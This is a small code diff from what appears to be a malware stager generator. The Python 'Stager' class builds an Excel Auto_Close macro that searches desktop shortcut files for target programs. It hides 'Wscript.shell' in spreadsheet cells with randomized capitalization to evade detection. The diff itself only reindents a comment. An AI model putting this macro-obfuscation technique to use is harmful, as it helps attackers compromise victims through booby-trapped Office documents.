@@ -157,7 +157,7 @@ class Stager:
 	    #build out the macro - will look for all .lnk files on the desktop, any that it finds it will inspect to determine whether it matches any of the target exe names
             macro = "Sub Auto_Close()\n"
 	
-		#writes strings + payload to cells of the target XLS doc
+	    #writes strings + payload to cells of the target XLS doc
 	    activeSheet.write(inputRow,inputCol,helpers.randomize_capitalization("Wscript.shell"))
 	    macro += "Set " + shellVar + " = CreateObject(activeSheet.Range(\""+self.coordsToCell(inputRow,inputCol)+"\").value)\n"
 	    inputCol = inputCol + random.randint(1,4)
